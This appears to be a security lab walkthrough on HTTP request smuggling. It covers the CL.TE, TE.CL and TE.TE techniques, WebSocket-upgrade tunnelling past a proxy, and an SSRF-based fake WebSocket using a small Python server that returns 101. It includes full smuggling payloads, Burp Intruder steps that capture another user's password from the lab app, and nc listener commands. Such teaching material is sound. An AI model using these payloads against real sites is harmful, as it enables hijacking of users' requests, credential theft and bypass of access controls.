Introduction to CL.TE request smuggling
CL.TE stands for Content-Length/Transfer-Encoding. The name CL.TE comes from the two headers involved: Content-Length and Transfer-Encoding. In CL.TE technique, the attacker exploits discrepancies between how different servers (typically a front-end and a back-end server) prioritize these headers. For example:

The proxy uses the Content-Length header to determine the end of a request.
The back-end server uses the Transfer-Encoding header.

Because of this discrepancy, it's possible to craft ambiguous requests that are interpreted differently by each server. For example, Imagine sending a request with both Content-Length and Transfer-Encoding headers. The front-end server might use the Content-Length header and think the request ends at a certain point due to the provided number of bytes. In contrast, the back-end server, relying on the Transfer-Encoding header, might interpret the request differently, leading to unexpected behaviour.

Exploiting CL.TE for Request Smuggling
To exploit the CL.TE technique, an attacker crafts a request that includes both headers, ensuring that the front-end and back-end servers interpret the request boundaries differently. For example, an attacker sends a request like:

Sample Request
POST /search HTTP/1.1
Host: example.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /update HTTP/1.1
Host: example.com
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

isadmin=true
Here, the front-end server sees the Content-Length of 130 bytes and believes the request ends after  isadmin=true. However, the back-end server sees the Transfer-Encoding: chunked and interprets the 0 as the end of a chunk, making the second request the start of a new chunk. This can lead to the back-end server treating the POST /update HTTP/1.1 as a separate, new request, potentially giving the attacker unauthorized access.


Introduction to TE.CL Technique
TE.CL stands for Transfer-Encoding/Content-Length. This technique is the opposite of the CL.TE method. In the TE.CL approach, the discrepancy in header interpretation is flipped because the front-end server uses the Transfer-Encoding header to determine the end of a request, and the back-end server uses the Content-Length header.

The TE.CL technique arises when the proxy prioritizes the Transfer-Encoding header while the back-end server prioritizes the Content-Length header.

Example: If an attacker sends a request with both headers, the front-end server or proxy might interpret the request based on the Transfer-Encoding header, while the back-end server might rely on the Content-Length header. This difference in interpretation might interpret the request differently, leading to unexpected behaviour.

Exploiting TE.CL for Request Smuggling
To exploit the TE.CL technique, an attacker crafts a specially designed request that includes both the Transfer-Encoding and Content-Length headers, aiming to create ambiguity in how the front-end and back-end servers interpret the request.

For example, an attacker sends a request like:

Sample Request
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

78
POST /update HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

isadmin=true
0
In the above payload, the front-end server sees the Transfer-Encoding: chunked header and processes the request as chunked. The 78 (hexadecimal for 120) indicates that the next 120 bytes are part of the current request's body. The front-end server considers everything up to the 0 (indicating the end of the chunked message) as part of the body of the first request.

The back-end server, however, uses the Content-Length header, which is set to 4. It processes only the first 4 bytes of the request, not including the entire smuggled request POST /update. The remaining part of the request, starting from POST /update, is then interpreted by the back-end server as a separate, new request.

The smuggled request is processed by the back-end server as if it were a legitimate, separate request. This request includes the isadmin=true parameter, which could potentially elevate the attacker's privileges or alter data on the server, depending on the application's functionality.

Introduction to TE.TE Technique
Transfer Encoding Obfuscation, also known as TE.TE stands for Transfer-Encoding/Transfer-Encoding. Unlike the CL.TE or TE.CL methods, the TE.TE technique arises when both the front-end and the back-end servers use the Transfer-Encoding header. In TE.TE technique, the attacker takes advantage of the servers' inconsistent handling of  Transfer-Encoding present in the HTTP headers.

The TE.TE vulnerability doesn't always require multiple Transfer-Encoding headers. Instead, it often involves a single, malformed Transfer-Encoding header that is interpreted differently by the front-end and back-end servers. In some cases, the front-end server might ignore or strip out the malformed part of the header and process the request normally, while the back-end server might interpret the request differently due to the malformed header, leading to request smuggling.



Example: An attacker manipulates the Transfer-Encoding header by including "chunked" in malformed variations. This is done to exploit how front-end and back-end servers prioritize the Transfer-Encoding (TE) header over Content-Length (CL). By crafting malformed Transfer-Encoding headers, the attacker aims to make one server ignore the TE header and use CL instead, leading to a discrepancy in how the request boundaries are interpreted between the front-end and back-end servers. This manipulation can result in either a CL.TE or TE.CL situation, depending on which server falls back to using the Content-Length.

Exploiting TE.TE for Request Smuggling
To exploit the TE.TE technique, an attacker may craft a request that includes Transfer-Encoding headers that use different encodings. For example, an attacker sends a request like:

Sample Request
POST / HTTP/1.1
Host: example.com
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: chunked1

4e
POST /update HTTP/1.1
Host: example.com
Content-length: 15

isadmin=true
0
In the above payload, the front-end server encounters two Transfer-Encoding headers. The first one is a standard chunked encoding, but the second one, chunked1, is non-standard. Depending on its configuration, the front-end server might process the request based on the first Transfer-Encoding: chunked header and ignore the malformed chunked1, interpreting the entire request up to the 0 as a single chunked message.

The back-end server, however, might handle the malformed Transfer-Encoding: chunked1 differently. It could either reject the malformed part and process the request similarly to the front-end server or interpret the request differently due to the presence of the non-standard header. If it processes only the first 4 bytes as indicated by the Content-length: 4, the remaining part of the request starting from POST /update is then treated as a separate, new request.

The smuggled request with the isadmin=true parameter is processed by the back-end server as if it were a legitimate, separate request. This could lead to unauthorized actions or data modifications, depending on the server's functionality and the nature of the /update endpoint.

Assessing the Application
The web application for this room uses the link http://httprequestsmuggling.thm. It features a Home, Login, and Contact form that enables users to access and send feedback to the developer. For demonstration, the submitted queries are saved to the /submissions directory. Below is the screenshot of the application: 

Homepage of he vulnerable application


Exploiting the Application
Using Burp Suite Proxy, intercept a request sent to the website's index. This request will become the baseline we will use to exploit the vulnerable application.

Baseline request to be used for smuggling

Send the request to Intruder and copy-paste the below payload to the Payload positions box.

Payload
POST / HTTP/1.1
Host: httprequestsmuggling.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 160
Transfer-Encoding: chunked

0

POST /contact.php HTTP/1.1
Host: httprequestsmuggling.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

username=test&query=ยง
Breakdown of the payload
In CL.TE vulnerability, since the proxy or the front-end prioritises the Content-Length header, 160 bytes of the body is assumed to be the body of the first POST. The front-end thinks this is a single request and forwards it into the pipeline, where the back-end server now prioritises Transfer-Encoding, ending the first POST request at the first 0 size chunk and assuming the second POST is a different request.

Payload positions box with the payload

Payload positions box with the payload

Go to the Payloads tab and set the Payload type to Null payloads. Subsequently, on the Payload settings, input 10000 to generate 10000 null payloads.

Null payloads settings

Go to the Resource pool tab and create a new resource pool. You may follow the screenshot below for the settings.

New resource pool

Click the Start Attack button in your Intruder tab to start the attack.

Attack started

After a few minutes, check the /submissions website directory to see if the request to contact.php is smuggled containing the request of other users.

Note: Accessing the vulnerable application while the smuggling is taking effect will capture your request instead of the request from the target user.

Submissions page containing the saved request

Go through the text files to check for the password that was appended to the query parameter.

.txt file containing the captured request of the target user

Use the password to log in to the application.


Smuggling HTTP requests through broken WebSocket Tunnels

To smuggle requests through a vulnerable proxy, we can create a malformed request such that the proxy thinks a WebSocket upgrade is performed, but the backend server doesn't really upgrade the connection. This will force the proxy into establishing a tunnel between client and server that will go unchecked since it assumes it is now a WebSocket connection, but the backend will still expect HTTP traffic.

One way to force this is to send an upgrade request with an invalid Sec-Websocket-Version header. This header is used to specify the version of the WebSocket protocol to use and will normally take the value of 13 in most current WebSocket implementations. If the server supports the requested version, it should issue a 101 Switching Protocols response and upgrade the connection.

But we aren't interested in upgrading the connection. If we send an unsupported value for the Sec-Websocket-Version header, the server will send a 426 Upgrade Required response to indicate the upgrade was unsuccessful:

Websocket upgrade with invalid version number

Some proxies may assume that the upgrade is always completed, regardless of the server response. This can be abused to smuggle HTTP requests once again by performing the following steps:

The client sends a WebSocket upgrade request with an invalid version number.
The proxy forwards the request to the backend server.
The backend server responds with 426 Upgrade Required. The connection doesn't upgrade, so the backend remains using HTTP instead of switching to a WebSocket connection.
The proxy doesn't check the server response and assumes the upgrade was successful. Any further communications will be tunnelled since the proxy believes they are part of an upgraded WebSocket connection.
Tricking the proxy by using an invalid WebSocket version number

It is important to note that this technique won't allow us to poison other users' backend connections. We will be limited to tunnelling requests through the proxy only, so we can bypass any restrictions imposed by the frontend proxy by using this trick.

Bypassing Proxy Restrictions

Let's check the application at http://10.65.169.2:8001/flag. This application is running behind a Varnish proxy with a vulnerable configuration. Our objective in this application is to retrieve the value stored in /flag.

As a first attempt, if we try to access /flag directly, we are presented with the following message:

Flag is denied by the proxy

This error message was sent by Varnish (the proxy) instead of the backend application, which should be interesting. If we try accessing another non-existent resource like http://10.65.169.2:8001/nonexistent134, the error message presented will be different. At this point, we should be suspicious that the frontend proxy is restricting access to /flag in the backend web server.

Luckily, there's also a WebSocket endpoint we can abuse at http://10.65.169.2:8001/socket. Let's send the following payload to try to smuggle a request for the flag inside a broken WebSocket connection:

GET /socket HTTP/1.1
Host: 10.65.169.2:8001
Sec-WebSocket-Version: 777
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: 10.65.169.2:8001

To send the request, we will use Burp's Repeater. To ensure Burp doesn't modify our request and break the attack, we need to make sure the Update Content-Length setting is disabled:

Disabling Update Content-Length setting in Burp

Once this is done, we can send our payload and should get the flag (note the two newlines at the end of the payload):

Smuggling a request through WebSockets

Just as expected, we get a 426 error from the initial attempt to upgrade the connection to a WebSocket. At this point, the proxy believes the rest of the connection uses the WebSocket protocol and will tunnel everything directly to the backend server, including our smuggled request for /flag.

What if the App Doesn't Speak WebSocket?

Note that some proxies will not even require the existence of a WebSocket endpoint for this technique to work. All we need is to fool the proxy into believing we are establishing a connection to a WebSocket, even if this isn't true. Look at what happens if you try to send the following payload (be sure to add two newlines after the payload in Burp):

GET / HTTP/1.1
Host: 10.65.169.2:8001
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: 10.65.169.2:8001

This payload should still work, even though the first request is directed to /, which is not a WebSocket-enabled endpoint. The proxy simply doesn't check the response from the upgrade, so you can use any payload that looks close enough to a WebSocket upgrade.

Note: This payload will randomly fail when using Burp. You can either retry the payload a couple of times until it works, or deliver it by pasting it into a terminal running nc 10.65.169.2 8001, where it will work every time (don't forget the trailing newlines).




Upgrading our Proxy

So far, we've been working with a proxy that won't check the web server's response to determine whether the WebSocket upgrade was successful. In this task, we'll replace the vulnerable Varnish proxy with an Nginx proxy that checks responses before tunnelling requests through a WebSocket connection. The backend application will still have the /socket endpoint enabled with WebSockets and the /flag endpoint as our target. The new application can be accessed via http://10.65.169.2:8002/.

First, let's try running the payload we used in the previous task to see if it works:

Testing our payload with Nginx as a proxy

Notice how Nginx won't leak the flag despite getting a 426 response for the initial WebSocket upgrade attempt. Since Nginx is checking the response code of the upgrade, it can determine that no valid WebSocket connection was established; therefore, it won't allow us to smuggle the /flag request.

You are free to try the second payload presented in the previous task, but you should obtain similar results.

Tricking the Proxy

Since we can't just smuggle requests anymore, we need to find a way to trick the proxy into believing a valid WebSocket connection has been established. This means we need to somehow force the backend web server to reply to our upgrade request with a fake 101 Switching Protocols response without actually upgrading the connection in the backend.

While we won't be able to do this for all applications, if our target app has some vulnerability that allows us to proxy requests back to a server we control as attackers, we might be able to inject the 101 Switching Protocols response to an arbitrary request. In these special cases, we should be able to smuggle requests through a fake WebSocket connection again.

Faking a websocket by leveraging SSRF

Leveraging SSRF

In this task's application, we will take advantage of an SSRF vulnerability to simulate a fake WebSocket upgrade. After a quick inspection, we can see that the application allows us to test the status of a URL. Each time we input a URL, the server will make a request to http://10.65.169.2:8002/check-url?server=<url> and return the status code from the corresponding response:

Taking advantage of SSRF

We can use nc in our AttackBox to check if we can direct a request to ourselves. We should get a response similar to this one:

AttackBox
user@attackbox$ nc -lvp 5555
Listening on 0.0.0.0 5555
Connection received on 10.65.169.2 52988
GET /test HTTP/1.1
Host: 10.10.11.155:5555
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
This means we can successfully use the SSRF vulnerability to influence the response of the backend server. All we need to do is spin up a web server that returns a 101 status, allowing us to fake a WebSocket upgrade.

Setting up the Attacker's Web Server

We can quickly set up a web server that responds with status 101 to every request with the following Python code:

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
Let's save the code to a file named myserver.py in our AttackBox and run it with the following command:

AttackBox
user@attackbox$ python3 myserver.py 5555
This should spin up a web server on port 5555 that will reply with a 101 status code to any request.

Faking a WebSocket

We are finally ready to launch our payload. Let's use Burp's Repeater to send a request to /check-url against our malicious server. The request should look like this:

GET /check-url?server=http://10.10.11.155:5555 HTTP/1.1
Host: 10.65.169.2:8002
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: 10.65.169.2:8002

If all goes as expected, you should get a request in your malicious web server and the flag value in Burp (note that you need to add two newlines at the end of your payload in Burp):

Smuggling a request through a fake websocket connection

Remember that /check-url is not a WebSocket endpoint. We are just manipulating both the request and response that the proxy gets to make it believe this is a real WebSocket. This means that the proxy will tunnel the second request in our payload as if it were part of a WebSocket connection, but the backend will just process the request as HTTP since there's no WebSocket in reality.




